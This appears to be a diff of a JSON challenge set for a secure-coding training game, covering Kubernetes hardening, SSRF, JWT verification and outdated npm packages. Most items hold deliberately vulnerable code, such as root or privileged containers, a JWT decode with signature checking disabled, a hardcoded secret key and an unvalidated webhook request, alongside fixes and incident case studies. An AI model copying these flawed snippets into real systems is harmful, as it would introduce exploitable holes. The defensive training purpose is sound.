-        "cwe": "CWE-276",
-        "cvss": 7.8,
-        "file_context": ".npmrc",
-        "task": "Disable arbitrary script executions on dependencies.",
-        "briefing": "Running arbitrary install scripts from npm packages executes system-level malware.",
-        "hint": "Enforce strict ignore-scripts parameters globally.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "npm install && run postinstall",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_SUPPLY_006",
-        "level": 18,
-        "title": "Mutable Base Image Tag",
-        "category": "Dependency & Supply-Chain Review",
-        "difficulty": "Easy",
-        "standard": "OWASP A06:2021",
-        "cwe": "CWE-353",
-        "cvss": 5.3,
-        "file_context": "Dockerfile",
-        "task": "Pin the base image using its cryptographic sha256 digest.",
-        "briefing": "Mutable image tags allow target updates to inject malicious dependencies silently.",
-        "hint": "Reference the package using the immutable hash mapping.",
-        "vulnCode": [
-            {
-                "n": 1,
                 "t": "FROM node:20-alpine",
                 "vuln": true
+            },
+            {
+                "n": 4,
+                "t": "WORKDIR /app",
+                "vuln": false
+            },
+            {
+                "n": 5,
+                "t": "COPY package*.json ./",
+                "vuln": false
             }
-        ]
+        ],
+        "stage": "build",
+        "intel_query": {
+            "github_ecosystem": "npm",
+            "github_package": "node"
+        }
     },
     {
-        "id": "APPSEC_K8S_001",
-        "level": 19,
-        "title": "Root Execution in Kubernetes",
-        "category": "Container Hardening (K8s)",
+        "id": "APPSEC_CNCF_001",
+        "level": 13,
+        "title": "Artifact Hub: K8s Non-Root Execution Policy",
+        "category": "Artifact Hub CNCF: Kubernetes Policy",
         "difficulty": "Medium",
         "standard": "Kubernetes Hardening",
         "cwe": "CWE-250",
         "cvss": 7.5,
-        "file_context": "pod.yaml",
-        "task": "Prevent container execution as administrative root user.",
-        "briefing": "Containers running as root allow namespace escape. Configure non-root configurations.",
-        "hint": "Set runAsNonRoot: true inside the security context.",
+        "file_context": "k8s/deployment.yaml",
+        "task": "Configure Pod SecurityContext spec to enforce runAsNonRoot: true and runAsUser: 10001.",
+        "briefing": "CNCF Policy Audit: Container process executing with root privilege (UID 0) inside container sandbox violates Kubernetes Security Standards.",
+        "hint": "Add securityContext: runAsNonRoot: true and runAsUser: 10001 under spec.template.spec.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: Container break-out exploits like CVE-2019-5736 (runc root exploit) allowed processes running as root (UID 0) inside a container to overwrite the host `/usr/bin/runc` binary, resulting in full host node takeover across Kubernetes clusters.",
         "vulnCode": [
             {
                 "n": 1,
-                "t": "securityContext:",
+                "t": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: payment-api",
                 "vuln": false
             },
             {
                 "n": 2,
-                "t": "  runAsUser: 0",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_K8S_002",
-        "level": 20,
-        "title": "Privileged Pod Privilege Escalation",
-        "category": "Container Hardening (K8s)",
-        "difficulty": "Hard",
-        "standard": "Kubernetes Hardening",
-        "cwe": "CWE-269",
-        "cvss": 8.8,
-        "file_context": "pod.yaml",
-        "task": "Disable privilege escalation and drop kernel capabilities.",
-        "briefing": "Privileged pods bypass security boundary. Disable privilege flags and drop permissions.",
-        "hint": "Disable capabilities and allowPrivilegeEscalation parameters.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "securityContext:",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "  privileged: true",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_K8S_003",
-        "level": 21,
-        "title": "Writable Root Filesystem",
-        "category": "Container Hardening (K8s)",
-        "difficulty": "Medium",
-        "standard": "Kubernetes Hardening",
-        "cwe": "CWE-732",
-        "cvss": 6.5,
-        "file_context": "pod.yaml",
-        "task": "Mount the container filesystem root as read-only.",
-        "briefing": "Writable container filesystem allows script injection. Enable read-only policies.",
-        "hint": "Set readOnlyRootFilesystem to true.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "securityContext:",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "  readOnlyRootFilesystem: false",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_K8S_004",
-        "level": 22,
-        "title": "Missing Resource Quotas",
-        "category": "Container Hardening (K8s)",
-        "difficulty": "Easy",
-        "standard": "Kubernetes Hardening",
-        "cwe": "CWE-400",
-        "cvss": 5.3,
-        "file_context": "pod.yaml",
-        "task": "Add limits and requests mapping cpu and memory.",
-        "briefing": "Lack of resource limits allows DoS. Define resource bounds.",
-        "hint": "Assign explicit memory/CPU limits.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "resources:",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "  # Limits undefined",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_K8S_005",
-        "level": 23,
-        "title": "Overly Permissive Secret Mount",
-        "category": "Container Hardening (K8s)",
-        "difficulty": "Hard",
-        "standard": "Kubernetes Hardening",
-        "cwe": "CWE-732",
-        "cvss": 7.5,
-        "file_context": "pod.yaml",
-        "task": "Limit mounted secret keys and restrict read-only file mode.",
-        "briefing": "Mounting entire secrets exposes unneeded data. Lock file attributes.",
-        "hint": "Limit items and set defaultMode to 0400.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "secret:",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "  secretName: prod-secrets",
-                "vuln": true
-            }
-        ]
-    },
-    {
-        "id": "APPSEC_K8S_006",
-        "level": 24,
-        "title": "Missing Ingress Network Policy",
-        "category": "Container Hardening (K8s)",
-        "difficulty": "Critical",
-        "standard": "Kubernetes Hardening",
-        "cwe": "CWE-284",
-        "cvss": 9.1,
-        "file_context": "networkpolicy.yaml",
-        "task": "Configure a default-deny ingress policy with explicit allow rules.",
-        "briefing": "Lack of network policies allows unrestricted traffic. Enforce default-deny rules.",
-        "hint": "Configure a NetworkPolicy specifying ingress and podSelector logic.",
-        "vulnCode": [
-            {
-                "n": 1,
-                "t": "kind: NetworkPolicy",
-                "vuln": false
-            },
-            {
-                "n": 2,
-                "t": "spec:",
+                "t": "spec:\n  template:\n    spec:\n      containers:\n      - name: api",
                 "vuln": false
             },
             {
                 "n": 3,
-                "t": "  podSelector: {}",
+                "t": "        # VULNERABLE: Running container as root UID 0",
+                "vuln": true
+            },
+            {
+                "n": 4,
+                "t": "        securityContext:\n          runAsUser: 0\n          runAsNonRoot: false",
                 "vuln": true
             }
-        ]
+        ],
+        "stage": "cluster",
+        "intel_query": {
+            "k8s_cwe": "CWE-250"
+        }
+    },
+    {
+        "id": "APPSEC_CNCF_002",
+        "level": 14,
+        "title": "Artifact Hub: K8s Drop Privileges Policy",
+        "category": "Artifact Hub CNCF: Kubernetes Policy",
+        "difficulty": "Hard",
+        "standard": "Kubernetes Hardening",
+        "cwe": "CWE-269",
+        "cvss": 8.8,
+        "file_context": "k8s/deployment.yaml",
+        "task": "Disable privilege escalation and drop ALL Linux kernel capabilities in securityContext.",
+        "briefing": "CNCF Policy Audit: Privileged container flag permits host kernel namespace compromise and container escape.",
+        "hint": "Set allowPrivilegeEscalation: false and capabilities: drop: ['ALL'] in container securityContext.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: Privileged containers running with Linux kernel capabilities like `CAP_SYS_ADMIN` allow attackers inside a container to mount host filesystems (`/dev/sda1`), escape namespace boundaries, and compromise physical cluster worker nodes.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "spec:\n  containers:\n  - name: auth-service\n    image: auth:v2.1",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "    # VULNERABLE: Container has full host capabilities and privileged access",
+                "vuln": true
+            },
+            {
+                "n": 3,
+                "t": "    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true",
+                "vuln": true
+            }
+        ],
+        "stage": "cluster",
+        "intel_query": {
+            "k8s_cwe": "CWE-269"
+        }
+    },
+    {
+        "id": "APPSEC_CNCF_003",
+        "level": 15,
+        "title": "Artifact Hub: K8s Read-Only Root Filesystem",
+        "category": "Artifact Hub CNCF: Kubernetes Policy",
+        "difficulty": "Medium",
+        "standard": "Kubernetes Hardening",
+        "cwe": "CWE-732",
+        "cvss": 6.5,
+        "file_context": "k8s/pod.yaml",
+        "task": "Enforce readOnlyRootFilesystem: true in container securityContext to block malware persistence.",
+        "briefing": "CNCF Policy Audit: Writable root filesystem allows attackers to download external tools and modify binaries.",
+        "hint": "Set readOnlyRootFilesystem: true and mount emptyDir volume for required /tmp directory.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: In cloud malware campaigns like Kinsing and TeamTNT, attackers gain entry into web containers and immediately write malicious cryptominers and rootkits into `/tmp` or `/usr/local/bin`. Enforcing a read-only root filesystem blocks malware persistence.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "spec:\n  containers:\n  - name: web-frontend\n    image: frontend:1.0",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "    # VULNERABLE: Root filesystem remains writable",
+                "vuln": true
+            },
+            {
+                "n": 3,
+                "t": "    securityContext:\n      readOnlyRootFilesystem: false",
+                "vuln": true
+            }
+        ],
+        "stage": "cluster",
+        "intel_query": {
+            "k8s_cwe": "CWE-732"
+        }
+    },
+    {
+        "id": "APPSEC_CNCF_004",
+        "level": 16,
+        "title": "Artifact Hub: K8s Resource Quotas Constraint",
+        "category": "Artifact Hub CNCF: Kubernetes Policy",
+        "difficulty": "Easy",
+        "standard": "Kubernetes Hardening",
+        "cwe": "CWE-400",
+        "cvss": 5.3,
+        "file_context": "k8s/deployment.yaml",
+        "task": "Define CPU and memory requests and limits for container spec to prevent cluster Resource Exhaustion DoS.",
+        "briefing": "CNCF Policy Audit: Missing resource bounds permits single pod to consume node memory and trigger OOM killer across cluster.",
+        "hint": "Add resources: requests: {memory: '256Mi', cpu: '250m'}, limits: {memory: '512Mi', cpu: '500m'}.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: Without resource limits, a single pod suffering from a memory leak or CPU-intensive infinite loop can exhaust worker node resources, triggering the Linux kernel Out-Of-Memory (OOM) killer to terminate adjacent critical production pods.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "spec:\n  containers:\n  - name: worker-service\n    image: worker:v4",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "    # VULNERABLE: Missing resource limits allows CPU/RAM exhaustion",
+                "vuln": true
+            },
+            {
+                "n": 3,
+                "t": "    # resources block omitted",
+                "vuln": true
+            }
+        ],
+        "stage": "cluster",
+        "intel_query": {
+            "k8s_cwe": "CWE-400"
+        }
+    },
+    {
+        "id": "APPSEC_CNCF_005",
+        "level": 17,
+        "title": "Artifact Hub: K8s Least-Privilege Secret Mount",
+        "category": "Artifact Hub CNCF: Kubernetes Policy",
+        "difficulty": "Hard",
+        "standard": "Kubernetes Hardening",
+        "cwe": "CWE-732",
+        "cvss": 7.5,
+        "file_context": "k8s/pod.yaml",
+        "task": "Restrict secret mount items and set defaultMode to 0400 in pod volume specification.",
+        "briefing": "CNCF Policy Audit: Overly permissive secret permissions (default 0644) expose private keys to non-root processes.",
+        "hint": "Set secret: secretName: db-creds, defaultMode: 0400 in pod volumes.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: When Kubernetes secrets are mounted with default permissions (0644), any unprivileged user or compromised low-privilege service running inside the pod container can read production TLS keys and database password files.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "spec:\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: production-api-keys\n      # VULNERABLE: Default mode 0644 exposes secrets to all container users",
+                "vuln": true
+            },
+            {
+                "n": 2,
+                "t": "      defaultMode: 420",
+                "vuln": true
+            }
+        ],
+        "stage": "cluster",
+        "intel_query": {
+            "k8s_cwe": "CWE-732"
+        }
+    },
+    {
+        "id": "APPSEC_CNCF_006",
+        "level": 18,
+        "title": "Artifact Hub: K8s Network Policy Isolation",
+        "category": "Artifact Hub CNCF: Kubernetes Policy",
+        "difficulty": "Critical",
+        "standard": "Kubernetes Hardening",
+        "cwe": "CWE-284",
+        "cvss": 9.1,
+        "file_context": "k8s/network-policy.yaml",
+        "task": "Define default-deny Ingress NetworkPolicy with explicit podSelector allow rule for ingress traffic.",
+        "briefing": "CNCF Policy Audit: Missing network isolation policy allows unrestricted cross-pod lateral movement.",
+        "hint": "Define NetworkPolicy spec with policyTypes: ['Ingress'] and matching podSelector.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: In Kubernetes, by default all pods can communicate with all other pods across all namespaces. In 2022, attackers exploiting a vulnerable frontend web service used unrestricted pod-to-pod network connectivity to pivot laterally and compromise backend database clusters.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-all-ingress",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "spec:\n  podSelector: {}\n  # VULNERABLE: Wildcard ingress permits unrestricted network traffic",
+                "vuln": true
+            },
+            {
+                "n": 3,
+                "t": "  ingress:\n  - {}",
+                "vuln": true
+            }
+        ],
+        "stage": "cluster",
+        "intel_query": {
+            "k8s_cwe": "CWE-284"
+        }
+    },
+    {
+        "id": "APPSEC_NVD_007",
+        "level": 19,
+        "title": "Server-Side Request Forgery (SSRF) Prevention",
+        "category": "NVD NIST: Application Security",
+        "difficulty": "Hard",
+        "standard": "OWASP A10:2021",
+        "cwe": "CWE-918",
+        "cvss": 8.6,
+        "file_context": "app/services/webhook_service.py",
+        "task": "Implement IP address resolution validation to block SSRF requests targeting cloud metadata endpoints (169.254.169.254) and private RFC1918 CIDRs.",
+        "briefing": "NVD Threat Feed: Unvalidated webhook URL field permits internal cloud metadata credential extraction and internal microservice port scanning.",
+        "hint": "Parse domain, resolve IPv4 address via socket.gethostbyname(), and verify ipaddress.ip_address(ip).is_private is False.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: The 2019 Capital One data breach exploited an SSRF flaw in a web application firewall. The attacker queried AWS Instance Metadata Service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), exfiltrated temporary IAM admin keys, and accessed 100+ million credit card applications stored in S3.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "import requests",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "import logging",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "logger = logging.getLogger(__name__)",
+                "vuln": false
+            },
+            {
+                "n": 5,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 6,
+                "t": "def dispatch_user_webhook(target_url: str, payload: dict):",
+                "vuln": false
+            },
+            {
+                "n": 7,
+                "t": "    # VULNERABLE: Direct HTTP request to user-supplied URL without IP range validation",
+                "vuln": true
+            },
+            {
+                "n": 8,
+                "t": "    logger.info(f\"Dispatching webhook notification to {target_url}\")",
+                "vuln": false
+            },
+            {
+                "n": 9,
+                "t": "    response = requests.post(target_url, json=payload, timeout=5)",
+                "vuln": true
+            },
+            {
+                "n": 10,
+                "t": "    return response.status_code",
+                "vuln": false
+            }
+        ],
+        "stage": "commit",
+        "intel_query": {
+            "nvd_cwe": "CWE-918"
+        }
+    },
+    {
+        "id": "APPSEC_NVD_008",
+        "level": 20,
+        "title": "JWT Signature Bypass Remediation",
+        "category": "NVD NIST: Application Security",
+        "difficulty": "Critical",
+        "standard": "OWASP A02:2021",
+        "cwe": "CWE-347",
+        "cvss": 9.1,
+        "file_context": "app/auth/jwt_verifier.py",
+        "task": "Enforce strict JWT algorithm whitelist in PyJWT decoding call and verify signature with HMAC key.",
+        "briefing": "NVD Threat Feed: JWT verifier accepts 'none' algorithm header, allowing attackers to forge arbitrary admin authentication tokens.",
+        "hint": "Use jwt.decode(token, SECRET_KEY, algorithms=['HS256']) and handle ExpiredSignatureError.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: In 2015, security researcher Tim McLean discovered that multiple JWT libraries allowed authentication bypass if an attacker set the header `\"alg\": \"none\"` and deleted the signature string. The server treated the unsigned token as valid, allowing full admin account takeover.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "import jwt",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "import logging",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 4,
+                "t": "SECRET_KEY = \"prod_super_secret_jwt_key_2026\"",
+                "vuln": false
+            },
+            {
+                "n": 5,
+                "t": "",
+                "vuln": false
+            },
+            {
+                "n": 6,
+                "t": "def authenticate_auth_header(token: str) -> dict:",
+                "vuln": false
+            },
+            {
+                "n": 7,
+                "t": "    # VULNERABLE: Disabling signature verification and allowing 'none' algorithm",
+                "vuln": true
+            },
+            {
+                "n": 8,
+                "t": "    decoded_claims = jwt.decode(token, options={\"verify_signature\": False})",
+                "vuln": true
+            },
+            {
+                "n": 9,
+                "t": "    return decoded_claims",
+                "vuln": false
+            }
+        ],
+        "stage": "commit",
+        "intel_query": {
+            "nvd_cwe": "CWE-347"
+        }
+    },
+    {
+        "id": "APPSEC_GHSA_007",
+        "level": 21,
+        "title": "Express body-parser DoS Prevention",
+        "category": "GitHub Advisory: Supply Chain",
+        "difficulty": "Medium",
+        "standard": "Supply Chain Security",
+        "cwe": "CWE-400",
+        "cvss": 7.5,
+        "file_context": "package.json",
+        "task": "Upgrade body-parser package in package.json to >=1.20.2 to fix unbounded payload buffer DoS.",
+        "briefing": "GitHub Security Advisory: Unbounded body parser payload size enables memory exhaustion DoS attack vectors.",
+        "hint": "Set \"body-parser\": \"^1.20.2\" in package.json dependencies.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: CVE-2022-29622 highlighted that unconfigured Node.js body-parser middleware allows attackers to send megabyte-sized JSON payloads, triggering node heap allocation crashes and bringing down API instances globally.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "{\n  \"dependencies\": {",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "    \"express\": \"^4.18.2\",",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "    // VULNERABLE: body-parser 1.19.0 vulnerable to DoS buffer inflation",
+                "vuln": true
+            },
+            {
+                "n": 4,
+                "t": "    \"body-parser\": \"1.19.0\",",
+                "vuln": true
+            },
+            {
+                "n": 5,
+                "t": "    \"cors\": \"^2.8.5\"\n  }\n}",
+                "vuln": false
+            }
+        ],
+        "stage": "build",
+        "intel_query": {
+            "github_ecosystem": "npm",
+            "github_package": "body-parser"
+        }
+    },
+    {
+        "id": "APPSEC_GHSA_008",
+        "level": 22,
+        "title": "Axios HTTP SSRF Patch",
+        "category": "GitHub Advisory: Supply Chain",
+        "difficulty": "Medium",
+        "standard": "Supply Chain Security",
+        "cwe": "CWE-918",
+        "cvss": 7.4,
+        "file_context": "package.json",
+        "task": "Upgrade axios package specifier in package.json to >=1.6.0 to fix authorization header leak across cross-domain redirects.",
+        "briefing": "GitHub Security Advisory: Axios leaks HTTP basic authorization headers during automatic 302 cross-origin redirects.",
+        "hint": "Set \"axios\": \"^1.6.0\" in dependencies.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: CVE-2023-45857 in Axios caused HTTP `Authorization: Bearer <JWT>` headers to be forwarded automatically when following 302 redirects to third-party attacker domains, exposing sensitive OAuth access tokens.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "{\n  \"dependencies\": {",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "    \"express\": \"^4.18.2\",",
+                "vuln": false
+            },
+            {
+                "n": 3,
+                "t": "    // VULNERABLE: Legacy axios version leaks Auth headers on redirect",
+                "vuln": true
+            },
+            {
+                "n": 4,
+                "t": "    \"axios\": \"0.21.1\"",
+                "vuln": true
+            },
+            {
+                "n": 5,
+                "t": "  }\n}",
+                "vuln": false
+            }
+        ],
+        "stage": "build",
+        "intel_query": {
+            "github_ecosystem": "npm",
+            "github_package": "axios"
+        }
+    },
+    {
+        "id": "APPSEC_CNCF_007",
+        "level": 23,
+        "title": "Artifact Hub: K8s Seccomp Profile Enforcement",
+        "category": "Artifact Hub CNCF: Kubernetes Policy",
+        "difficulty": "Hard",
+        "standard": "Kubernetes Hardening",
+        "cwe": "CWE-250",
+        "cvss": 7.8,
+        "file_context": "k8s/pod.yaml",
+        "task": "Enforce seccompProfile type: RuntimeDefault in Pod securityContext to restrict unneeded system calls.",
+        "briefing": "CNCF Policy Audit: Missing seccomp profile enables container process to invoke dangerous kernel syscalls.",
+        "hint": "Add seccompProfile: type: RuntimeDefault inside securityContext.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: Dangerous Linux kernel system calls like `unshare()`, `ptrace()`, and `sys_reboot()` have been exploited in kernel 0-day exploits to escape containers. Applying `RuntimeDefault` seccomp profiles blocks 300+ unneeded kernel syscalls.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "spec:\n  securityContext:",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "    # VULNERABLE: Missing seccomp profile filter spec",
+                "vuln": true
+            },
+            {
+                "n": 3,
+                "t": "    runAsNonRoot: true",
+                "vuln": false
+            }
+        ],
+        "stage": "cluster",
+        "intel_query": {
+            "k8s_cwe": "CWE-250"
+        }
+    },
+    {
+        "id": "APPSEC_CNCF_008",
+        "level": 24,
+        "title": "Artifact Hub: K8s HostPort Restriction Policy",
+        "category": "Artifact Hub CNCF: Kubernetes Policy",
+        "difficulty": "Hard",
+        "standard": "Kubernetes Hardening",
+        "cwe": "CWE-269",
+        "cvss": 8.1,
+        "file_context": "k8s/pod.yaml",
+        "task": "Remove hostPort bindings from container port specification and use ClusterIP / Ingress services instead.",
+        "briefing": "CNCF Policy Audit: Direct hostPort binding exposes pod directly on node IP address, bypassing CNI plugin policies.",
+        "hint": "Remove hostPort attribute from ports specification.",
+        "history_case_study": "REAL-WORLD INCIDENT CASE STUDY: Binding a container directly to `hostPort: 80` forces Kubernetes to bind the port directly on the host node's network interface, bypassing NetworkPolicies and exposing the internal pod to the public internet.",
+        "vulnCode": [
+            {
+                "n": 1,
+                "t": "spec:\n  containers:\n  - name: app-server\n    ports:\n    - containerPort: 8080",
+                "vuln": false
+            },
+            {
+                "n": 2,
+                "t": "      # VULNERABLE: Direct host port mapping bypasses ingress controls",
+                "vuln": true
+            },
+            {
+                "n": 3,
+                "t": "      hostPort: 80",
+                "vuln": true
+            }
+        ],
+        "stage": "cluster",
+        "intel_query": {
+            "k8s_cwe": "CWE-269"
+        }
     }
 ]
